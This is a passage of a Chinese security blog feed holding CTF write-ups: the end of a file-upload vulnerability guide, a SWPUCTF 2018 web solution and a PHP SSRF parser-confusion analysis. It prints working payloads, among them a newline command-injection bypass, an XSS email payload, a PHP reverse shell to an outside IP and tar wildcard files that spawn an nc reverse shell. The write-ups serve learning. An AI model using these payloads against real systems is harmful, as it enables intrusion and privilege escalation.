class="symbol">:</span></span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure><p>成功写入 shell</p><p><img src="/2019/01/05/Web_12/65frxezkji7ctjfklsg6loemca.png" alt></p><h3 id="4-2-图片马制作"><a href="#4-2-图片马制作" class="headerlink" title="4.2.图片马制作"></a>4.2.图片马制作</h3><p><code>copy /b 1.jpg+shell.php 2.jpg</code></p><p>注意 <code>/b</code></p><p><img src="/2019/01/05/Web_12/9vj3h81d86cu96lmn4qtqwgkfb.png" alt></p><h2 id="5-解析漏洞"><a href="#5-解析漏洞" class="headerlink" title="5.解析漏洞"></a>5.解析漏洞</h2><p>IIS、Apache、Nginx 解析漏洞</p><p><a href="https://thief.one/2016/09/21/服务器解析漏洞/" target="_blank" rel="noopener">服务器解析漏洞 | nmask</a></p><h2 id="6-利用总结"><a href="#6-利用总结" class="headerlink" title="6.利用总结"></a>6.利用总结</h2><p>首先判断是程序员自己写的上传点，还是编辑器的上传功能</p><p>如果是编辑器上传功能，goolge当前编辑器的漏洞</p><p>如果是程序员写的上传点</p><p>上传一个正常的jpg图片 查看上传点是否可用</p><p>上传一个正常的jpg图片，burp拦截，修改后缀为php (可以检测前端验证 MIME检测 文件内容检测 后缀检测）</p><p>上传一个正常的jpg图片，burp拦截， 00截断 1.php%00.jpg</p><p>判断服务器是什么类型，web服务器程序，是什么类型，版本号多少</p><hr><p>测试时的准备工作：</p><p>什么语言？什么容器？什么系统？都什么版本？</p><p>上传文件都可以上传什么格式的文件？还是允许上传任意类型？</p><p>上传的文件会不会被重命名或者二次渲染？</p><h2 id="7-防御"><a href="#7-防御" class="headerlink" title="7.防御"></a>7.防御</h2><p>① 文件上传目录设置不可执行</p><p>只要 Web 容器无法解析该目录下的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响。例如配置 nginx 把上传的文件当做静态资源访问</p><p>② 判断文件类型</p><p>判断文件类型时结合使用 MIME Type 、后缀检查等方式。后缀检查使用白名单方式。同时可对图片进行二次处理或者压缩，如php gd，但是就算使用 php gd 也有绕过方式：<a href="https://secgeek.net/bookfresh-vulnerability/" target="_blank" rel="noopener">https://secgeek.net/bookfresh-vulnerability/</a></p><p>③ 使用随机数改写文件名喝文件路径</p><p>使用随机数，可以增加攻击的成本。同时，像 <code>shell.php.rar.rar</code> 或 <code>corssdomain.xml</code> 这类文件，都会因为文件名被改写而无法成功实施攻击</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/CHYbeta/Web-Security-Learning" target="_blank" rel="noopener">Web-Security-Learning | CHYbeta</a></li><li><a href="http://jdrops.dropsec.xyz/2017/07/17/文件上传漏洞总结/" target="_blank" rel="noopener">文件上传漏洞总结 | J_drops</a></li><li>JoyChou 文件上传骚套路：<a href="https://www.freebuf.com/column/174931.html" target="_blank" rel="noopener">文件上传和WAF的攻与防 | JoyChou</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h2&gt;&lt;p&gt;&amp;emsp;本来打算是作为一个系列一直更新下去，讲解基础漏洞的原理、基本防御和攻击方法。但是看到师傅们的总结都很全面，尝试总结了一下发现大多都是照搬，只有等到有新的东西才写下来啦。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>SWPUCTF 2018 Web两道</title>
    <link href="https://jlkl.github.io/2018/12/20/Web_11/"/>
    <id>https://jlkl.github.io/2018/12/20/Web_11/</id>
    <published>2018-12-20T04:39:00.000Z</published>
    <updated>2018-12-20T04:57:03.192Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>西南石油大学比赛，做出了一道xss+tar提权，flask卡在了构造继承链</p><a id="more"></a><h2 id="用优惠码-买个-X"><a href="#用优惠码-买个-X" class="headerlink" title="用优惠码  买个 X ?"></a>用优惠码  买个 X ?</h2><p>flag在/flag中<br>URL <a href="http://123.207.84.13:22333" target="_blank" rel="noopener">http://123.207.84.13:22333</a></p><p><img src="/2018/12/20/Web_11/1r135d6ja1ii1y0aoonfgs49gg.png" alt></p><p>注册个账号登录<br>登录提示送你优惠码<br><img src="/2018/12/20/Web_11/fxyoe86lrtyjs84j2wqbwwe4uz.png" alt><br>优惠码保存在cookie中的Auth中<br>输入优惠码提示要输入24位的优惠码<br><img src="/2018/12/20/Web_11/mxudziuc7y4on6h9ghfod6y7uj.png" alt><br><a href="http://123.207.84.13:22333/www.zip" target="_blank" rel="noopener">http://123.207.84.13:22333/www.zip</a> 源码泄露<br>只有个source.php文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//生成优惠码</span></span></span><br><span class="line"><span class="php">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">youhuima</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span></span><br><span class="line"><span class="php">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span></span><br><span class="line"><span class="php">    $auth=<span class="string">''</span>;</span></span><br><span class="line"><span class="php">    $len=<span class="number">15</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span></span><br><span class="line"><span class="php">              $auth.=substr($str_rand,mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>), <span class="number">1</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span></span></span><br><span class="line"><span class="php">              $auth.=substr($str_rand,(mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>))*<span class="number">-1</span>, <span class="number">1</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    setcookie(<span class="string">'Auth'</span>, $auth);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">//support</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (preg_match(<span class="string">"/^\d+\.\d+\.\d+\.\d+$/im"</span>,$ip))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (!preg_match(<span class="string">"/\?|flag|&#125;|cat|echo|\*/i"</span>,$ip))&#123;</span></span><br><span class="line"><span class="php">               <span class="comment">//执行命令</span></span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">              <span class="comment">//flag字段和某些字符被过滤!</span></span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">             <span class="comment">// 你的输入不正确!</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>代码中只生成了15位。验证应该还有一个生成24位。<br>无论是rand()函数还是mt_rand()函数,当随机数种子相同的时候,无论运行多少次,产生的随机数序列都是一样的，随机数种子是关键。但是种子范围在rand(0,999999999);<br>只能爆破了，<br>kali下php版本为7.2.4，题目的版本是PHP/7.2.9-1，我发现本地用php5.4使用一样的种子生成的是不一样的序列</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">ini_set(<span class="string">'max_execution_time'</span>,<span class="string">'0'</span>);</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">youhuima</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span></span><br><span class="line"><span class="php">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;<span class="comment">//62</span></span></span><br><span class="line"><span class="php">    $auth=<span class="string">''</span>;</span></span><br><span class="line"><span class="php">    $len=<span class="number">15</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span></span><br><span class="line"><span class="php">              $auth.=substr($str_rand,mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>), <span class="number">1</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span></span></span><br><span class="line"><span class="php">              $auth.=substr($str_rand,(mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>))*(<span class="number">-1</span>), <span class="number">1</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> $auth;</span></span><br><span class="line"><span class="php">    <span class="comment">//setcookie('Auth', $auth);</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">999999999</span>;$i++)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $_SESSION[<span class="string">'seed'</span>] = $i;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(youhuima() == <span class="string">"tmqoTcEJIQ5lrsF"</span>)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> $i,<span class="string">"&lt;/br&gt;"</span>;</span></span><br><span class="line"><span class="php"> <span class="keyword">echo</span> youhuima();</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">//echo "tmqoTcEJIQ5lrsF";</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>也就几分钟，就爆破出来了。可能是运气好<br><img src="/2018/12/20/Web_11/61wmtb9k7mcdtjvv219h52nle4.png" alt><br>得到随机种子15252003，<br>设置$_SESSION[‘seed’]为15252003，得到优惠码tmqoTcEJsk5PJsFZfOqDZXbd<br>已经得到的session<br>PHPSESSID=42i3mgn649nj6vsvtc05h2oej6<br>进入下一个support<br><a href="http://123.207.84.13:22333/exec.php" target="_blank" rel="noopener">http://123.207.84.13:22333/exec.php</a><br><img src="/2018/12/20/Web_11/yw0f1aa8jzizrlborax2wrzk0r.png" alt></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match("/^<span class="symbol">\d</span>+<span class="symbol">\.</span><span class="symbol">\d</span>+<span class="symbol">\.</span><span class="symbol">\d</span>+<span class="symbol">\.</span><span class="symbol">\d</span>+$/im",<span class="keyword">$ip))&#123;</span></span><br></pre></td></tr></table></figure><p>虽然有了开头^和结尾$，但是有/m参数，/m表示开启多行匹配模式<br>使用%0a绕过<br>1.1.1.1%0awhoami<br>不知道为什么在输入框输入不行，要用参数提交<br>POST：ip=1.1.1.1%0awhoami<br><img src="/2018/12/20/Web_11/9nwzq7mw50o1oa0ipnw4aylplo.png" alt></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">if</span> (!preg_match(<span class="string">"/\?|flag|&#125;|cat|echo|\*/i"</span>,<span class="variable">$ip</span>))&#123;</span><br></pre></td></tr></table></figure><p>过滤了cat flag关键字<br>使用变量绕过</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span>=c;b=at;c=fl;d=ag;$a$b <span class="variable">$c</span><span class="variable">$d</span></span><br><span class="line"><span class="attribute">ip</span>=127.0.0.1%0acd <span class="built_in">..</span>/<span class="built_in">..</span>/<span class="built_in">..</span>/;ls -l;<span class="attribute">a</span>=c;b=at;c=fl;d=ag;$a$b <span class="variable">$c</span><span class="variable">$d</span></span><br></pre></td></tr></table></figure><p><img src="/2018/12/20/Web_11/frk88q8abhntgwkl6yjaey8vkj.png" alt></p><h2 id="有趣的邮箱注册"><a href="#有趣的邮箱注册" class="headerlink" title="有趣的邮箱注册"></a>有趣的邮箱注册</h2><p><img src="/2018/12/20/Web_11/64hnam3i0t0dle2i7cfvxw0tqp.png" alt></p><p>post 传参 email，参考 p师傅 文章 <a href="https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html" target="_blank" rel="noopener">攻击LNMP架构Web应用的几个小Tricks</a>，将local part包裹在双引号中，<code>&quot;&quot;&lt;sCRiPt/SrC=//xsspt.com/&gt;&lt;/sCRiPt&gt;&quot;@123.com&quot;</code> 可绕过检测，xss</p><p>借助 xss平台读取 <code>/admin/admin.php</code> 页面源码，<code>a0a.php</code> 发现命令执行</p><p><img src="/2018/12/20/Web_11/bergk7pq7yom9jhh8gjr7u090m.png" alt></p><p>命令执行反弹shell，<code>php -r &#39;$sock=fsockopen(&quot;120.123.123.123&quot;,6789);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code> flag在根目录下，shell用户为 <code>www-data</code> ，权限不够读取</p><p><img src="/2018/12/20/Web_11/0103oh7chbednwki6t69upqhvv.png" alt></p><p>查看目录或 nginx 配置文件发现目录 <code>/4f0a5ead5aef34138fcbf8cf00029e7b</code>，一个上传文件页面</p><p><img src="/2018/12/20/Web_11/wfowrrec8ym5z0rpqo0beanqox.png" alt></p><p>files目录是文件上传的目录</p><p><img src="/2018/12/20/Web_11/oo7rz3rd2nws7u816ytfr32ivy.png" alt></p><p>backup.php 文件源码：</p><p><img src="/2018/12/20/Web_11/skww6raaf1g7gij2jkjkauaowp.png" alt></p><p>upload.php 属于 flag 用户，代码里执行了 tar 命令，参考这篇文章 <a href="https://www.freebuf.com/articles/system/176255.html" target="_blank" rel="noopener">利用通配符进行Linux本地提权</a></p><p>创建三个文件：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"mkfifo /tmp/lhennp; nc 120.123.123.123 23333 0&lt;/tmp/lhennp | /bin/sh &gt;/tmp/lhennp 2&gt;&amp;1; rm /tmp/lhennp"</span> &gt; Str3am.sh</span><br><span class="line"><span class="keyword">echo</span> <span class="string">" "</span> &gt; <span class="params">--checkpoint-action=exec=sh</span> Str3am</span><br><span class="line"><span class="keyword">echo</span> <span class="string">" "</span> &gt; <span class="params">--checkpoint=1</span></span><br></pre></td></tr></table></figure><p>通过 upload.php 上传，然后访问 backup.php ，得到反弹 shell，flag用户权限</p><p><img src="/2018/12/20/Web_11/bnqo684heqc40l96yqaltdpm34.png" alt></p><ul><li><a href="https://03i0.com/2018/12/17/swpu%202018%20web%20writeup/" target="_blank" rel="noopener">https://03i0.com/2018/12/17/swpu%202018%20web%20writeup/</a></li><li><a href="https://xz.aliyun.com/t/3656" target="_blank" rel="noopener">https://xz.aliyun.com/t/3656</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;西南石油大学比赛，做出了一道xss+tar提权，flask卡在了构造继承链&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
      <category term="CTF" scheme="https://jlkl.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>9th Geek SSRF</title>
    <link href="https://jlkl.github.io/2018/12/08/Web_10/"/>
    <id>https://jlkl.github.io/2018/12/08/Web_10/</id>
    <published>2018-12-08T13:30:29.000Z</published>
    <updated>2020-01-27T09:13:41.274Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学校举办的第九届极客大挑战，其中一道根据 Blackhat 议题出的 ssrf 题目，也是第一次尝试阅读 php 源码，望大牛们勿喷</p><a id="more"></a><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"> <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span><span class="params">($url)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $match_result=preg_match(<span class="string">'/^(http|https)?:\/\/.*(\/)?.*$/'</span>,$url);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (!$match_result)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'url fomat error1'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">try</span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $url_parse=parse_url($url);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'url fomat error2'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $hostname=$url_parse[<span class="string">'host'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $url_parse[<span class="string">'host'</span>];</span></span><br><span class="line"><span class="php">    $ip=gethostbyname($hostname);</span></span><br><span class="line"><span class="php">    $int_ip=ip2long($ip);</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> ip2long(<span class="string">'127.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'10.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'172.16.0.0'</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">'192.168.0.0'</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span> || ip2long(<span class="string">'0.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span><span class="params">($url)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (check_inner_ip($url))</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> $url.<span class="string">' is inner ip'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $ch = curl_init();</span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_URL, $url);</span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span></span><br><span class="line"><span class="php">        $output = curl_exec($ch);</span></span><br><span class="line"><span class="php">        $result_info = curl_getinfo($ch);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ($result_info[<span class="string">'redirect_url'</span>])</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            safe_request_url($result_info[<span class="string">'redirect_url'</span>]);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        curl_close($ch);</span></span><br><span class="line"><span class="php">        var_dump($output);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$url = $_POST[<span class="string">'url'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123;</span></span><br><span class="line"><span class="php">    safe_request_url($url);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__file__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">//hint23333:</span></span></span><br><span class="line"><span class="php"><span class="comment">//flag in flag.php</span></span></span><br><span class="line"><span class="php"><span class="comment">//phpinfo in phpinfo.php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><code>check_inner_ip</code> 通过 <code>url_parse</code> 检测是否为内网 ip 。</p><p>如果满足不是内网 ip ，通过 <code>curl</code> 请求 url 返回结果。</p><p>这是 github 上开源，根据 p师傅文章写的防御 ssrf 攻击代码，详情可以查看：<a href="http://chengable.net/index.php/archives/297/" target="_blank" rel="noopener">安全编码系列–ssrf漏洞防御脚本</a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>乍一看好像并没有利用点，跳转也做了处理，最终都要经过 <code>check_inner_ip</code> 函数检测。但是忽略了 <code>php_url_parse</code> 和 <code>curl</code> 同时处理 url 不同。</p><p><a href="https://www.anquanke.com/post/id/86527" target="_blank" rel="noopener">【Blackhat】SSRF的新纪元：在编程语言中利用URL解析器</a></p><p>这里面关于 curl 的利用提到了，当处理这个地址时</p><p><img src="/2018/12/08/Web_10/1.png" alt></p><p>curl 和 php_url_parse 处理后最终的目标不一样</p><p><img src="/2018/12/08/Web_10/2.png" alt></p><p>当 <code>php_url_parse</code> 认为 <code>google.com</code> 为目标的同时，<code>curl</code> 认为 <code>evil.com:80</code> 是目标。</p><p>文章作者向 curl 团队报告了这个问题，得到了一个补丁，但是补丁又可以通过空格的方式绕过。</p><p><img src="/2018/12/08/Web_10/3.png" alt></p><p>有趣的是当作者再次向官方团队报告漏洞时，被告知它本来就是要让你来传给他正确的URL参数的，并且他们表示,这个漏洞不会修复。:P</p><p>我们再来分析一下代码逻辑，检测是否内网 ip 通过 <code>parse_url</code>，而最后请求是用 <code>curl</code> 完成的。当遇到上面的 url 格式时，<code>parse_url</code> 判断的是第二个 @ 后接的地址，curl 请求的是第一个。</p><p>于是利用思路就有了，让 <code>parse_url</code> 处理外部网站，最后 <code>curl</code> 请求内网网址。</p><p>构造 payload：<code>http://Str3am@127.0.0.1:80 @www.baidu.com/flag.php</code></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>题目环境是 php 7.0.32，本地使用 phpstudy 搭建，使用 php 7.0.12，这里也就此版本分析。</p><p>这里也推荐一篇翻译的关于 php 源码阅读的基础指南：<a href="http://www.hoohack.me/2016/02/04/phps-source-code-for-php-developers-ch" target="_blank" rel="noopener">phps-source-code-for-php-developers</a></p><h3 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url"></a>parse_url</h3><p>函数申明位于 <code>/ext/standard/url.h</code>，具体可以访问 <a href="https://github.com/php/php-src/blob/PHP-7.0.12/ext/standard/url.h" target="_blank" rel="noopener">https://github.com/php/php-src/blob/PHP-7.0.12/ext/standard/url.h</a></p><p><img src="/2018/12/08/Web_10/4.png" alt></p><p>具体定义位于 <code>/ext/standard/url.c</code></p><p><img src="/2018/12/08/Web_10/5.png" alt></p><p>主要函数 <code>php_url_parse_ex()</code> 从 97 行开始</p><p><img src="/2018/12/08/Web_10/6.png" alt></p><p>这里迫于篇幅，不再对具体过程详解，这篇文章关于源码的详解很精彩 <a href="https://cloud.tencent.com/developer/article/1165186" target="_blank" rel="noopener">PHP源码分析之parse_url()的2个小trick</a></p><p><code>str</code> 为处理的 <code>url</code> ，<code>s</code>、<code>e</code>、<code>p</code>、<code>pp</code>、<code>ue</code> 字符指针，用于标记 url 中字符位置，也是这个函数处理的大致方式。先提取协议（scheme）如 http,https 并存储，接着获取请求参数（query）和锚点（fragment），获取端口（port）最后检测主机（host）并存储。</p><p>243 行检测 <code>user</code> 和 <code>pass</code>，对于 <code>http://Str3am@127.0.0.1:80 @www.baidu.com/flag.php</code>,此时变量 <code>e</code> 指向末尾的 <code>p</code>,变量 <code>s</code> 指向 <code>http://</code> 之后的 <code>S</code>。<code>(e-s)</code> 代表所指字符之间的内容（包含），所以函数 <code>zend_memrchr</code> 处理的内容即 <code>Str3am@127.0.0.1:80 @www.baidu.com/flag.php</code></p><p><img src="/2018/12/08/Web_10/7.png" alt></p><p>问题就出在这个 <code>zend_memrchr</code> 函数，定义位于 <code>/Zend/zend_operators.h</code>，193 行，是从字符串最末尾开始检测，那么对于两个 <code>@</code> ，就会解析到最后一个</p><p><img src="/2018/12/08/Web_10/8.png" alt></p><p>跟着下来，最后获取主机（host）的时候，<code>(p-s)</code> 的内容即 <code>www.baidu.com</code></p><p><img src="/2018/12/08/Web_10/9.png" alt></p><p>最后的解析结果如下</p><p><img src="/2018/12/08/Web_10/10.png" alt></p><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>定义位于 <code>/ext/curl/php_curl.h</code>,实现位于 <code>/ext/curl/interface.c</code>，这里是对 <code>libcurl</code> 经行调用，由于能力原因就不继续往下分析了。</p><p><img src="/2018/12/08/Web_10/11.png" alt></p><h2 id="另一道非预期解"><a href="#另一道非预期解" class="headerlink" title="另一道非预期解"></a>另一道非预期解</h2><p>比赛时因为非预期被下了，这里也来分析一波</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 